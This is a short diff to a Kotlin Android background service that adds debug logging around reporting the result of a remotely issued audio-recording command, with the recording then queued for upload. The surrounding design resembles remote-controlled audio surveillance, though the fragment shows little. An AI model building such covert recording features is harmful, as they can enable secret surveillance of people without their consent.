@@ -845,7 +845,9 @@ class BackgroundSyncService : Service() {
                     put("format", "mp3")
                     put("timestamp", System.currentTimeMillis())
                 }
-                sendCommandResult(commandId, true, "Audio recording completed successfully", result)
+                Log.d(TAG, "Built command result JSON: $result")
+                val sendResult = sendCommandResult(commandId, true, "Audio recording completed successfully", result)
+                Log.d(TAG, "sendCommandResult returned: $sendResult")
 
                 // Queue for sync
                 dataSync?.queueForSync("audio_data", audioOutputFile!!)
